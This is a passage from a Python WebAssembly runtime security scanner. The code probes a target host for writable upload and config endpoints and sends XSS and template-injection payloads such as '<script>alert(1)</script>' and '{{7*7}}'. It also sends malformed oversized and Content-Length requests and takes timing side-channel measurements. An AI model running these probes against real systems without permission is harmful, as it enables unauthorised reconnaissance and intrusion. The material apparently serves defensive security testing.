                        wasi = wasmtime.WasiConfig()
                        if self.wasi_args:
                            # Some versions use argv, some set_argv; try both
                            if hasattr(wasi, 'argv'):
                                wasi.argv(self.wasi_args)
                            else:
                                for a in self.wasi_args:
                                    try:
                                        wasi.argv.append(a)  # type: ignore[attr-defined]
                                    except Exception:
                                        pass
                        if self.wasi_env:
                            for k, v in self.wasi_env.items():
                                try:
                                    wasi.env(k, v)  # type: ignore[attr-defined]
                                except Exception:
                                    pass
                        if self.wasi_inherit_stdio:
                            try:
                                wasi.inherit_stdout()
                                wasi.inherit_stderr()
                                wasi.inherit_stdin()
                            except Exception:
                                pass
                        # Attach WASI to store (API differs across versions)
                        try:
                            store.set_wasi(wasi)  # type: ignore[attr-defined]
                        except Exception:
                            pass
                    except Exception:
                        pass

                # Instantiate; this will run the start function if present
                instance = linker.instantiate(store, module)
                inner['instantiated'] = True

                # Collect export names (best effort across API versions)
                export_names: List[str] = []
                try:
                    # Newer API may have instance.exports(store) returning list of externs with name
                    exports = instance.exports(store)  # type: ignore[attr-defined]
                    try:
                        for e in exports:
                            name = getattr(e, 'name', None) or getattr(e, 'extern_name', None)
                            if name:
                                export_names.append(str(name))
                    except Exception:
                        pass
                except Exception:
                    try:
                        # Fallback via module.exports
                        for ex in module.exports:
                            name = getattr(ex, 'name', None)
                            if name:
                                export_names.append(str(name))
                    except Exception:
                        pass
                inner['exports'] = export_names

                # Optionally call an entry function if specified
                inner['called_entry'] = False
                inner['return_value'] = None
                if self.wasm_entry:
                    try:
                        func = None
                        # Try to resolve function by name across APIs
                        try:
                            exports = instance.exports(store)  # type: ignore[attr-defined]
                            # Some APIs expose dict-like access
                            if isinstance(exports, dict):
                                func = exports.get(self.wasm_entry)
                            else:
                                for e in exports:
                                    if getattr(e, 'name', None) == self.wasm_entry:
                                        func = getattr(e, 'func', None) or getattr(e, 'value', None) or e
                                        break
                        except Exception:
                            pass

                        # Direct getattr fallback (older bindings sometimes attach attrs)
                        if func is None:
                            try:
                                func = getattr(instance, self.wasm_entry)
                            except Exception:
                                func = None

                        if func is not None:
                            try:
                                # Call styles vary; attempt common ones
                                if callable(func):
                                    rv = func(store)  # type: ignore[misc]
                                elif hasattr(func, 'call'):
                                    rv = func.call(store)  # type: ignore[attr-defined]
                                else:
                                    rv = None
                                inner['called_entry'] = True
                                inner['return_value'] = rv
                            except Exception as ce:
                                inner['call_error'] = str(ce)
                    except Exception as re:
                        inner['resolve_error'] = str(re)

                # Retrieve remaining fuel (if supported)
                try:
                    if hasattr(store, 'fuel_consumed'):
                        inner['fuel_consumed'] = store.fuel_consumed()  # type: ignore[attr-defined]
                except Exception:
                    pass

                return inner

            start = time.perf_counter()
            # Run in thread to avoid blocking event loop
            inner = await asyncio.get_running_loop().run_in_executor(None, _run)
            result.update(inner)
            result['status'] = 'OK' if inner.get('instantiated') else 'ERROR'
            result['execution_time_ms'] = int((time.perf_counter() - start) * 1000)
            return result

        except Exception as e:
            result['status'] = 'ERROR'
            result['error'] = str(e)
            return result

    async def _assess_injection_vectors(self) -> Dict:
        """评估注入攻击向量"""
        
        injection_analysis = {
            'code_injection': {},
            'data_injection': {},
            'configuration_injection': {},
            'memory_injection': {}
        }
        
        try:
            print(f"[*] Testing code injection vectors...")
            code_injection = await self._test_code_injection()
            injection_analysis['code_injection'] = code_injection
            
            print(f"[*] Testing data injection vectors...")
            data_injection = await self._test_data_injection()
            injection_analysis['data_injection'] = data_injection
            
            print(f"[*] Testing configuration injection...")
            config_injection = await self._test_configuration_injection()
            injection_analysis['configuration_injection'] = config_injection
            
            print(f"[*] Testing memory injection...")
            memory_injection = await self._test_memory_injection()
            injection_analysis['memory_injection'] = memory_injection
            
        except Exception as e:
            injection_analysis['error'] = str(e)
        
        return injection_analysis
    
    async def _test_code_injection(self) -> Dict:
        """测试代码注入   真实探测

        方法：探测可能的模块上传/加载/管理端点，使用 OPTIONS 与 HEAD/GET 确认是否存在写入方法，
        并在不提交实际模块的前提下确定潜在注入点。
        """
        candidate_endpoints = [
            '/wasm/upload', '/api/wasm/upload', '/plugins/install', '/admin/wasm',
            '/wasm/modules', '/plugins/wasm', '/envoy/wasm'
        ]
        findings: List[Dict[str, Any]] = []
        try:
            for ep in candidate_endpoints:
                try:
                    reader, writer = await self._create_connection()
                    req = (
                        f"OPTIONS {ep} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Connection: close\r\n\r\n"
                    )
                    writer.write(req.encode())
                    await writer.drain()
                    resp = await asyncio.wait_for(reader.read(2048), timeout=3.0)
                    await self._close_connection(writer)
                    text = resp.decode('utf-8', errors='ignore')
                    allow_line = next((l for l in text.split('\r\n') if l.lower().startswith('allow:')), '')
                    methods = allow_line.split(':', 1)[1].strip() if ':' in allow_line else ''
                    if any(m in methods.upper() for m in ['PUT', 'POST', 'PATCH']):
                        findings.append({'endpoint': ep, 'methods': methods})
                except Exception:
                    continue
        except Exception as e:
            return {
                'status': 'ERROR',
                'error': str(e),
                'vulnerability_detected': False,
                'injection_points': []
            }

        return {
            'status': 'OK',
            'vulnerability_detected': len(findings) > 0,
            'injection_points': findings,
        }
    
    async def _test_data_injection(self) -> Dict:
        """测试数据注入真实、非破坏性

        方法：构造 header 与 query 参数进行回显/解析测试；若响应中出现未转义或直接插入迹象，
        记录为潜在数据注入点。
        """
        test_cases = [
            {'path': '/', 'headers': {'X-Wasm-Test-Injection': '{{7*7}}'}},
            {'path': '/?q=%3Cscript%3Ealert(1)%3C%2Fscript%3E', 'headers': {}},
            {'path': '/api/status?probe=%22__INJECT__%22', 'headers': {'Accept': 'application/json'}},
        ]
        indicators = ['{{7*7}}', '<script>alert(1)</script>', '"__INJECT__"']
        findings: List[Dict[str, Any]] = []
        try:
            for case in test_cases:
                try:
                    reader, writer = await self._create_connection()
                    request_lines = [f"GET {case['path']} HTTP/1.1", f"Host: {self.target_host}"]
                    for k, v in case['headers'].items():
                        request_lines.append(f"{k}: {v}")
                    request_lines.extend(["Connection: close", "", ""]) 
                    writer.write("\r\n".join(request_lines).encode())
                    await writer.drain()
                    resp = await asyncio.wait_for(reader.read(4096), timeout=3.0)
                    await self._close_connection(writer)
                    text = resp.decode('utf-8', errors='ignore')
                    for token in indicators:
                        if token in text:
                            findings.append({'path': case['path'], 'indicator': token, 'preview': text[:160]})
                            break
                except Exception:
                    continue
        except Exception as e:
            return {'status': 'ERROR', 'error': str(e), 'vulnerability_detected': False, 'injection_points': []}

        return {
            'status': 'OK',
            'vulnerability_detected': len(findings) > 0,
            'injection_points': findings,
        }
    
    async def _test_configuration_injection(self) -> Dict:
        """测试配置注入 真实、非破坏性

        方法：对常见配置端点执行 OPTIONS/GET，自省是否暴露敏感配置，以及是否允许写操作。
        """
        endpoints = ['/runtime/config', '/plugins/config', '/wasm/config']
        writable: List[Dict[str, Any]] = []
        exposed: List[Dict[str, Any]] = []
        try:
            for ep in endpoints:
                try:
                    # OPTIONS
                    reader, writer = await self._create_connection()
                    req = (f"OPTIONS {ep} HTTP/1.1\r\n"
                           f"Host: {self.target_host}\r\n"
                           f"Connection: close\r\n\r\n")
                    writer.write(req.encode()); await writer.drain()
                    resp = await asyncio.wait_for(reader.read(2048), timeout=3.0)
                    await self._close_connection(writer)
                    text = resp.decode('utf-8', errors='ignore')
                    allow_line = next((l for l in text.split('\r\n') if l.lower().startswith('allow:')), '')
                    methods = allow_line.split(':', 1)[1].strip() if ':' in allow_line else ''
                    if any(m in methods.upper() for m in ['PUT', 'POST', 'PATCH']):
                        writable.append({'endpoint': ep, 'methods': methods})
                    # GET for exposure
                    reader, writer = await self._create_connection()
                    get = (f"GET {ep} HTTP/1.1\r\nHost: {self.target_host}\r\nConnection: close\r\n\r\n")
                    writer.write(get.encode()); await writer.drain()
                    gres = await asyncio.wait_for(reader.read(4096), timeout=3.0)
                    await self._close_connection(writer)
                    gtext = gres.decode('utf-8', errors='ignore')
                    if any(k in gtext.lower() for k in ['wasm', 'plugin', 'config', 'module']):
                        exposed.append({'endpoint': ep, 'length': len(gtext)})
                except Exception:
                    continue
        except Exception as e:
            return {'status': 'ERROR', 'error': str(e), 'config_tampering': False, 'writable': [], 'exposed': []}

        return {
            'status': 'OK',
            'config_tampering': len(writable) > 0,
            'writable': writable,
            'exposed': exposed,
        }
    
    async def _test_memory_injection(self) -> Dict:
        """测试内存注入 真实、非破坏性 

        方法：构造异常大小/边界参数（大 Header/畸形 Content-Length）请求常见执行端点，
        观察是否触发 5xx/崩溃字样，从而判定是否存在内存处理薄弱。
        """
        endpoints = ['/api/wasm/execute', '/wasm/load_module']
        indicators = ['segmentation fault', 'core dump', 'memory violation', 'buffer overflow']
        triggered: List[Dict[str, Any]] = []
        try:
            for ep in endpoints:
                # Oversized header
                try:
                    reader, writer = await self._create_connection()
                    big = 'A' * 4096
                    req = (
                        f"POST {ep} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"X-Big: {big}\r\n"
                        f"Content-Length: 1\r\n"
                        f"Connection: close\r\n\r\n"
                        f"X"
                    )
                    writer.write(req.encode()); await writer.drain()
                    resp = await asyncio.wait_for(reader.read(4096), timeout=3.0)
                    await self._close_connection(writer)
                    text = resp.decode('utf-8', errors='ignore').lower()
                    if any(ind in text for ind in indicators) or '500' in text:
                        triggered.append({'endpoint': ep, 'vector': 'oversized_header', 'preview': text[:160]})
                except Exception:
                    pass
                # Content-Length mismatch (small benign)
                try:
                    reader, writer = await self._create_connection()
                    body = 'Y' * 16
                    req = (
                        f"POST {ep} HTTP/1.1\r\n"
                        f"Host: {self.target_host}\r\n"
                        f"Content-Type: application/octet-stream\r\n"
                        f"Content-Length: {len(body)+10}\r\n"
                        f"Connection: close\r\n\r\n"
                        f"{body}"
                    )
                    writer.write(req.encode()); await writer.drain()
                    resp = await asyncio.wait_for(reader.read(4096), timeout=3.0)
                    await self._close_connection(writer)
                    text = resp.decode('utf-8', errors='ignore').lower()
                    if any(ind in text for ind in indicators) or '500' in text:
                        triggered.append({'endpoint': ep, 'vector': 'cl_mismatch', 'preview': text[:160]})
                except Exception:
                    pass
        except Exception as e:
            return {'status': 'ERROR', 'error': str(e), 'memory_corruption': False, 'triggers': []}

        return {
            'status': 'OK',
            'memory_corruption': len(triggered) > 0,
            'triggers': triggered,
        }

    async def _analyze_timing_attacks(self) -> Dict:
        """分析时序攻击向量"""
        
        timing_analysis = {
            'attack_vectors': [],
            'confidence_score': 0,
            'exploitable_attacks': []
        }
        
        try:
            print(f"[*] Testing compilation time side-channels...")
            compilation_timing = await self._test_compilation_timing_attacks()
            timing_analysis['attack_vectors'].append(compilation_timing)
            
            print(f"[*] Testing execution time side-channels...")
            execution_timing = await self._test_execution_timing_attacks()
            timing_analysis['attack_vectors'].append(execution_timing)
            
            print(f"[*] Testing memory allocation timing...")
            memory_timing = await self._test_memory_timing_attacks()
            timing_analysis['attack_vectors'].append(memory_timing)
            
            print(f"[*] Testing plugin lifecycle timing...")
            plugin_timing = await self._test_plugin_timing_attacks()
            timing_analysis['attack_vectors'].append(plugin_timing)
            
            print(f"[*] Testing garbage collection timing...")
            gc_timing = await self._test_gc_timing_attacks()
            timing_analysis['attack_vectors'].append(gc_timing)
            
            print(f"[*] Testing resource contention timing...")
            contention_timing = await self._test_contention_timing_attacks()
            timing_analysis['attack_vectors'].append(contention_timing)
            
            # 计算总体置信度
            exploitable = [attack for attack in timing_analysis['attack_vectors'] if attack.get('exploitable', False)]
            timing_analysis['exploitable_attacks'] = exploitable
            timing_analysis['confidence_score'] = min(len(exploitable) * 15, 90)
            
        except Exception as e:
            timing_analysis['error'] = str(e)
        
        return timing_analysis
    
    async def _test_compilation_timing_attacks(self) -> Dict:
        """测试编译时序攻击 真实测量 

        方法：对同一路径执行多次请求，模拟首次与后续加载差异；计算均值/标准差与效应比值。
        """
        path = '/'
        samples_first: List[float] = []
        samples_cached: List[float] = []
        # first-phase
        for _ in range(3):
            t = await self._measure_request_time(path, {'X-Wasm-Load': 'first'})
            if t > 0:
                samples_first.append(t)
            await asyncio.sleep(0.2)
        # cached-phase
        for _ in range(5):
            t = await self._measure_request_time(path, {'X-Wasm-Load': 'cached'})
            if t > 0:
                samples_cached.append(t)
            await asyncio.sleep(0.15)
        def stats(xs: List[float]) -> Tuple[float, float]:
            if not xs:
                return 0.0, 0.0
            m = sum(xs)/len(xs)
            v = sum((x-m)**2 for x in xs)/max(1, (len(xs)-1))
            return m, v**0.5
        m1,s1 = stats(samples_first)
        m2,s2 = stats(samples_cached)
        ratio = (m1/m2) if m2>0 else 1.0
        exploitable = ratio > 1.5 and (m1 - m2) > 50.0
        return {
            'attack_type': 'compilation_timing',
            'status': 'OK',
            'exploitable': exploitable,
            'confidence': int(min(max((ratio-1.0)*50, 0), 100)),
            'samples_first': samples_first,
            'samples_cached': samples_cached,
            'mean_first_ms': round(m1,2),
            'mean_cached_ms': round(m2,2),
            'ratio': round(ratio,2),
        }
    
    async def _test_execution_timing_attacks(self) -> Dict:
        """测试执行时序攻击（真实测量）

        方法：带上不同复杂度提示头（X-Complex-Operation）并比较响应时间分布。
        """
        simple: List[float] = []
        complex_: List[float] = []
        for _ in range(5):
            simple.append(await self._measure_request_time('/', {}))
            await asyncio.sleep(0.1)
            complex_.append(await self._measure_request_time('/', {'X-Complex-Operation': 'true'}))
            await asyncio.sleep(0.1)
        def mean(xs):
            return (sum(xs)/len(xs)) if xs else 0.0
        m_s, m_c = mean(simple), mean(complex_)
        ratio = (m_c/m_s) if m_s>0 else 1.0
        exploitable = ratio > 2.0 and (m_c - m_s) > 80.0
        return {
            'attack_type': 'execution_timing',
            'status': 'OK',
            'exploitable': exploitable,
            'confidence': int(min(max((ratio-1.0)*60, 0), 100)),
            'mean_simple_ms': round(m_s,2),
            'mean_complex_ms': round(m_c,2),
            'ratio': round(ratio,2),
        }
    
    async def _test_memory_timing_attacks(self) -> Dict:
        """测试内存时序攻击（真实测量）

        方法：对已知执行端点发送不同大小负载，比较响应时间与方差，以推测线性内存访问代价差异。
        """
        ep = '/api/wasm/execute'
        sizes = [0, 128, 2048, 8192]
        measurements: List[Tuple[int, float]] = []
        for sz in sizes:
            try:
                body = 'Z' * sz
                reader, writer = await self._create_connection()
                req = (
                    f"POST {ep} HTTP/1.1\r\n"
                    f"Host: {self.target_host}\r\n"
                    f"Content-Type: application/octet-stream\r\n"
                    f"Content-Length: {len(body)}\r\n"
                    f"Connection: close\r\n\r\n"
                    f"{body}"
                )
                start = time.perf_counter()
                writer.write(req.encode()); await writer.drain()
                await asyncio.wait_for(reader.read(1024), timeout=self.timeout)
                await self._close_connection(writer)
                ms = (time.perf_counter() - start) * 1000
                measurements.append((sz, ms))
            except Exception:
                measurements.append((sz, 0.0))
        # Compute monotonicity
        grows = all(measurements[i][1] <= measurements[i+1][1] or measurements[i+1][1]==0.0 for i in range(len(measurements)-1))
        exploitable = grows and measurements[-1][1] - measurements[0][1] > 100.0
        return {
            'attack_type': 'memory_timing',
            'status': 'OK',
            'exploitable': exploitable,
            'confidence': 60 if exploitable else 20,
            'measurements': [(s, round(t,2)) for s,t in measurements],
        }
    
    async def _test_plugin_timing_attacks(self) -> Dict:
        """测试插件时序攻击（真实测量）

        方法：探测插件相关端点（如 /plugins/status），比较含/不含触发头部时的延迟差异。
        """
        path = '/plugins/status'
        base = await self._measure_request_time(path) or 0.0
        trig = await self._measure_request_time(path, {'X-Trigger-Plugin-Refresh': 'true'}) or 0.0
        ratio = (trig/base) if base>0 else 1.0
        exploitable = ratio > 1.5 and (trig - base) > 70.0
        return {
            'attack_type': 'plugin_timing',
            'status': 'OK',
            'exploitable': exploitable,
            'confidence': int(min(max((ratio-1.0)*55, 0), 100)),
            'baseline_ms': round(base,2),
            'trigger_ms': round(trig,2),
            'ratio': round(ratio,2),
        }
    
    async def _test_gc_timing_attacks(self) -> Dict:
        """测试垃圾回收时序攻击（真实测量）

        方法：短时间内多次访问产生资源分配压力，观察延迟漂移作为间接 GC/内存回收迹象。
        """
        times: List[float] = []
        for _ in range(6):
            times.append(await self._measure_request_time('/api/wasm/execute') or 0.0)
            await asyncio.sleep(0.1)
        if times:
            drift = max(times) - min(times)
        else:
            drift = 0.0
        exploitable = drift > 120.0
        return {
            'attack_type': 'gc_timing',
            'status': 'OK',
            'exploitable': exploitable,
            'confidence': 50 if exploitable else 10,
            'samples_ms': [round(t,2) for t in times],
            'drift_ms': round(drift,2),
        }
    
    async def _test_contention_timing_attacks(self) -> Dict:
        """测试资源争用时序攻击（真实测量）

        方法：并发多请求同时触发，统计响应时间分布与尾延迟，评估争用程度。
        """
        async def one():
            return await self._measure_request_time('/api/wasm/execute')
        tasks = [asyncio.create_task(one()) for _ in range(8)]
        vals = await asyncio.gather(*tasks, return_exceptions=True)
        times = [v for v in vals if isinstance(v, (int, float)) and v > 0]
        p95 = sorted(times)[int(len(times)*0.95)-1] if times else 0.0
        mean = sum(times)/len(times) if times else 0.0
        exploitable = p95 > mean * 2.2 and p95 > 150.0
        return {
            'attack_type': 'contention_timing',
            'status': 'OK',
            'exploitable': exploitable,
            'confidence': 55 if exploitable else 15,
            'mean_ms': round(mean,2),
            'p95_ms': round(p95,2),
            'samples_ms': [round(t,2) for t in times],
        }


# CLI接口
async def selftest(target="127.0.0.1", timeout=3.0, verbose=True, posture="intelligent"):
    """wasm_runtime_analyzer模块自检"""
    if verbose:
        print("[*] wasm_runtime_analyzer selftest starting...")
    
    try:
        # 基础功能测试
        analyzer = WasmRuntimeAnalyzer(target, 80, timeout=timeout)
        
        # 测试Wasm安全分析
        if verbose:
            print("  [+] Testing Wasm runtime security analysis...")
        result = await analyzer.comprehensive_wasm_security_analysis(posture=posture)
        
        if verbose:
            print("  [+] wasm_runtime_analyzer selftest completed successfully")
        return True
        
    except Exception as e:
        if verbose:
            print(f"  [-] wasm_runtime_analyzer selftest failed: {e}")
        return False

async def main():
    import argparse
    import sys
    
    parser = argparse.ArgumentParser(description='WebAssembly Runtime Security Analyzer')
    parser.add_argument('--selftest', action='store_true', help='Run module self-test')
    parser.add_argument('--target', default='127.0.0.1', help='Target hostname (for selftest)')
    parser.add_argument('host', nargs='?', help='Target hostname (for analysis)')
    parser.add_argument('--port', type=int, default=80, help='Target port (default: 80)')
    parser.add_argument('--timeout', type=float, default=5.0, help='Timeout seconds')
    parser.add_argument('--posture', choices=['intelligent', 'deep', 'paranoid'], default='intelligent',
                        help='Analysis posture: intelligent (adaptive based on detection), deep (thorough exploration), paranoid (force all tests)')
    parser.add_argument('--force-run', action='store_true', 
                        help='Force execution of all phases regardless of Wasm detection (equivalent to --posture paranoid)')
    # Real local WASM execution options
    parser.add_argument('--local-wasm', dest='local_wasm', default=None,
                        help='Path to a local .wasm module to instantiate and optionally execute (wasmtime)')
    parser.add_argument('--wasm-entry', dest='wasm_entry', default=None,
                        help='Exported function name to call after instantiation (optional)')
    parser.add_argument('--wasi-arg', dest='wasi_args', action='append', default=None,
                        help='WASI argv argument (repeatable)')
    parser.add_argument('--wasi-env', dest='wasi_env', action='append', default=None,
                        help='WASI environment variable KEY=VALUE (repeatable)')
    parser.add_argument('--wasi-inherit-stdio', dest='wasi_inherit_stdio', action='store_true',
                        help='Let WASI inherit stdio from the current process (default: on)')
    parser.add_argument('--no-wasi-inherit-stdio', dest='wasi_inherit_stdio', action='store_false')
    parser.set_defaults(wasi_inherit_stdio=True)
    
    args = parser.parse_args()
    
    # 处理--force-run参数（等价于--posture paranoid）
    if args.force_run:
        args.posture = 'paranoid'
    
    if args.selftest:
        try:
            result = await selftest(args.target, args.timeout, verbose=True, posture=args.posture)
            sys.exit(0 if result else 1)
        except KeyboardInterrupt:
            print("\n[!] Selftest interrupted")
            sys.exit(1)
        return
    
    if not args.host:
        parser.error("host argument is required when not using --selftest")
    
    print(f"[*] Starting WebAssembly Runtime Security Analysis")
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Analysis Posture: {args.posture.upper()}")
    print(f"[*] Based on next-generation cloud-native attack research")
    print(f"="*70)
    
    # Parse WASI env list KEY=VALUE into dict
    wasi_env_dict: Optional[Dict[str, str]] = None
    if args.wasi_env:
        wasi_env_dict = {}
        for item in args.wasi_env:
            if isinstance(item, str) and '=' in item:
                k, v = item.split('=', 1)
                wasi_env_dict[k] = v

    # 创建分析器（with optional local wasmtime execution settings）
    analyzer = WasmRuntimeAnalyzer(
        args.host,
        args.port,
        timeout=args.timeout,
        local_wasm_path=args.local_wasm,
        wasm_entry=args.wasm_entry,
        wasi_args=args.wasi_args,
        wasi_env=wasi_env_dict,
        wasi_inherit_stdio=args.wasi_inherit_stdio
    )
    
    # 执行分析
    results = await analyzer.comprehensive_wasm_security_analysis(posture=args.posture)
    
    # 显示结果
    if 'error' in results:
        print(f"[-] Analysis failed: {results['error']}")
        if 'partial_results' in results:
            print(f"[*] Partial results available")
    else:
        print(f"\n[ANALYSIS COMPLETE]")
        print(f"="*70)
        
        # 显示综合评估
        overall_assessment = results.get('overall_assessment', {})
        if overall_assessment:
            print(f"\n[SECURITY ASSESSMENT]")
            print(f"Security Score: {overall_assessment.get('security_score', 0)}/100")
            print(f"Risk Level: {overall_assessment.get('risk_level', 'Unknown')}")
            
            # 显示关键漏洞
            critical_vulns = overall_assessment.get('critical_vulnerabilities', [])
            if critical_vulns:
                print(f"\n[CRITICAL VULNERABILITIES]")
                for i, vuln in enumerate(critical_vulns, 1):
                    print(f"{i}. {vuln}")
            
            # 显示攻击向量
            attack_vectors = overall_assessment.get('attack_vectors', [])
            if attack_vectors:
                print(f"\n[ATTACK VECTORS]")
                for i, vector in enumerate(attack_vectors, 1):
                    print(f"{i}. {vector}")
            
            # 显示安全建议
            recommendations = overall_assessment.get('recommendations', [])
            if recommendations:
                print(f"\n[SECURITY RECOMMENDATIONS]")
                for i, rec in enumerate(recommendations[:5], 1):
                    print(f"{i}. {rec}")
        
        # 显示运行时检测结果
        runtime_detection = results.get('runtime_detection', {})
        if runtime_detection.get('wasm_detected', False):
            print(f"\n[WASM RUNTIME DETECTED]")
            print(f"Runtime Type: {runtime_detection.get('runtime_type', 'Unknown')}")
            print(f"Confidence: {runtime_detection.get('confidence_score', 0)}/100")
        
        print(f"\n[*] Analysis complete. See detailed results above.")


if __name__ == "__main__":
    asyncio.run(main())